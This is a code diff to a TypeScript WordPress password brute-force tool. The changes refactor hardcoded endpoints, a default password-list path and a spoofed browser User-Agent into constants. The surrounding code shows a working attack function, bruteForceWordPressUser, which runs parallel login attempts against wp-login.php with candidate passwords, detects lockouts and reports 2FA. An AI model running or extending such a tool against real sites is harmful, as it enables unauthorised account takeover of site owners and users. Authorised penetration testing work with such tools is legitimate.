@@ -1,5 +1,6 @@
 import * as fs from 'fs';
 import * as path from 'path';
+import { ENDPOINTS, CONSTANTS } from './constants.js';
 
 export interface BruteForceResult {
   target: string;
@@ -19,7 +20,7 @@ export interface BruteForceResult {
 export async function bruteForceWordPressUser(
   targetUrl: string,
   username: string,
-  passwordFile: string = 'passwords.txt',
+  passwordFile: string = CONSTANTS.DEFAULT_PASSWORD_FILE,
   options?: { workers?: number; delay?: number; timeout?: number; maxAttempts?: number }
 ): Promise<BruteForceResult> {
   const workers = options?.workers || 5;
@@ -65,7 +66,6 @@ export async function bruteForceWordPressUser(
       found = { password: success.password, needs2fa: success.needs2fa };
     }
 
-
     const lockouts = results.filter(r => r?.lockedOut).length;
     if (lockouts > workers * 0.6) {
       console.log('\n[BruteForce] Lockout detected, stopping.');
@@ -106,12 +106,12 @@ async function tryLogin(
   const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
 
   try {
-    const loginUrl = new URL('/wp-login.php', targetUrl).toString();
+    const loginUrl = new URL(ENDPOINTS.WP_LOGIN, targetUrl).toString();
     const formData = new URLSearchParams({
       log: username,
       pwd: password,
       'wp-submit': 'Log In',
-      redirect_to: new URL('/wp-admin/', targetUrl).toString(),
+      redirect_to: new URL(ENDPOINTS.WP_ADMIN, targetUrl).toString(),
       testcookie: '1',
     });
 
@@ -121,7 +121,7 @@ async function tryLogin(
       redirect: 'manual',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'User-Agent': CONSTANTS.DEFAULT_USER_AGENT,
         'Referer': loginUrl,
       },
       body: formData.toString(),
